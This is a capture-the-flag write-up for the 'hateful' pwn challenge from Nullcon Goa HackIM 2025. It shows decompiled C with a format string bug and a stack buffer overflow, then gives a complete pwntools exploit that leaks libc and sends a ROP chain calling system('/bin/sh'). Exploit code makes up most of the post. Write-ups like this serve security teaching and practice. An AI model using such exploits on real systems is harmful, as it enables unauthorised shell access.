---
title: "hateful - Nullcon Goa HackIM 2025 CTF"
category: "pwn"
subcategory: "stack"
type: "writeup"
tags: ["pwn", "buffer-overflow", "rop", "format-string", "scanf", "eval", "stack", "nullcon-goa-hackim-2025-ctf", "2025", "ctf-writeup"]
summary: "There is a format string and buffer overflow vulnarability in sendmessage() function"
source:
  name: "CTFtime writeup #39960"
  url: "https://ctftime.org/writeup/39960"
ctf:
  name: "Nullcon Goa HackIM 2025 CTF"
  year: 2025
  challenge: "hateful"
---

## Metadata

- **CTF:** Nullcon Goa HackIM 2025 CTF
- **Task:** hateful
- **Author team:** InfoSecIITR
- **CTFtime:** <https://ctftime.org/writeup/39960>

---
## Pwn / Hateful 

There is a format string and buffer overflow vulnarability in `send_message()` function  
```C  
int send_message()  
{  
char format[112]; // [rsp+0h] [rbp-460h] BYREF  
char s[1008]; // [rsp+70h] [rbp-3F0h] BYREF

puts("please provide your bosses email!");  
printf(">> ");  
__isoc99_scanf("%99s%*c", format);  
printf("email provided: ");  
printf(format);  
putchar(10);  
puts("now please provide the message!");  
fgets(s, 4096, stdin);  
return puts("Got it! we will send the message for him later!");  
}  
```  
`%151$p` is used as input to get a libc leak which can be used to craft a ROP chain consisting of   
```  
ret; //stack allignment  
pop rdi;   
</bin/sh address>  
system;   
```

#### Complete Exploit 

```python  
from pwn import *  
context.log_level = 'debug'  
p = process("./hateful_patched")  
# p = remote("52.59.124.14", 5020)  
libc = ELF("./libc.so.6")

p.sendlineafter(">> ", "yay")  
p.sendlineafter(">> ", "%151$p")

p.recvuntil("l provided: ")  
leak = eval(p.recvline().strip().decode()) - (0x74121144624a - 0x74121141f000)

libc.address = leak

[log.info](http://log.info)("Libc base: " + hex(libc.address))  
pop_rdi = libc.address + 0x0017a3cf  
ret = libc.address + 0x0017ae62

payload = cyclic(1016) + p64(ret) + p64(pop_rdi) + p64(next(libc.search("/bin/sh"))) + p64(libc.sym["system"])   
p.sendline(payload)  
p.interactive()  
```
